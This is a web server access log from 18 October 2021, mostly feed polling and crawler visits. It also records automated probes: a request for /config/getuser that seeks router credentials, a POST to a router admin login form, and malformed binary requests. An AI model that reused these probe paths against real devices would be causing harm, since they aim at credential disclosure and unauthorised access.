106.75.64.59 - - [18/Oct/2021:19:46:44 +0200] "GET / HTTP/1.0" 301 162 "-" "-"
5.173.42.7 - - [18/Oct/2021:19:54:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:20:09:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
162.142.125.44 - - [18/Oct/2021:20:23:56 +0200] "GET / HTTP/1.1" 200 1345 "-" "-"
162.142.125.44 - - [18/Oct/2021:20:23:57 +0200] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
5.173.42.7 - - [18/Oct/2021:20:24:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
209.141.62.185 - - [18/Oct/2021:20:33:04 +0200] "GET /config/getuser?index=0 HTTP/1.1" 400 248 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
5.173.42.7 - - [18/Oct/2021:20:39:02 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
205.185.120.103 - - [18/Oct/2021:20:42:39 +0200] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
5.173.42.7 - - [18/Oct/2021:20:54:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
34.238.250.23 - - [18/Oct/2021:20:56:34 +0200] "GET /rss HTTP/1.1" 301 5 "-" "Ruby"
34.238.250.23 - - [18/Oct/2021:20:56:34 +0200] "GET /rss/ HTTP/1.1" 200 2217 "-" "Ruby"
5.173.42.7 - - [18/Oct/2021:21:09:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
183.136.225.9 - - [18/Oct/2021:21:18:39 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.9 - - [18/Oct/2021:21:18:40 +0200] "GET / HTTP/1.1" 200 1345 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.9 - - [18/Oct/2021:21:18:41 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.9 - - [18/Oct/2021:21:18:43 +0200] "GET / HTTP/1.1" 200 595 "http://85.255.1.106:80" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.9 - - [18/Oct/2021:21:18:44 +0200] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.9 - - [18/Oct/2021:21:18:47 +0200] "GET /favicon.ico HTTP/1.1" 200 595 "http://85.255.1.106:80/favicon.ico" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
5.173.42.7 - - [18/Oct/2021:21:24:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
161.35.230.183 - - [18/Oct/2021:21:32:55 +0200] "\x00\x0E8\xB4F\x1B\xFB\x09\xB9^T\x00\x00\x00\x00\x00" 400 150 "-" "-"
5.173.42.7 - - [18/Oct/2021:21:39:02 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
207.46.13.9 - - [18/Oct/2021:21:53:46 +0200] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.26 - - [18/Oct/2021:21:53:56 +0200] "GET /sitemap-tags.xml HTTP/2.0" 200 351 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
5.173.42.7 - - [18/Oct/2021:21:54:02 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
209.141.51.171 - - [18/Oct/2021:21:56:28 +0200] "POST /boaform/admin/formLogin HTTP/1.1" 301 162 "http://85.255.1.106:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.51.171 - - [18/Oct/2021:21:56:29 +0200] "" 400 0 "-" "-"
209.141.56.209 - - [18/Oct/2021:21:57:09 +0200] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
181.214.206.112 - - [18/Oct/2021:22:05:04 +0200] "3\xC8 \xE4o\x83h\xB4a\xDEZ\xD7T\xD0L\xCAF\xC2?\xBC" 400 150 "-" "-"
5.173.42.7 - - [18/Oct/2021:22:09:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
186.33.80.99 - - [18/Oct/2021:22:19:53 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
5.173.42.7 - - [18/Oct/2021:22:24:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
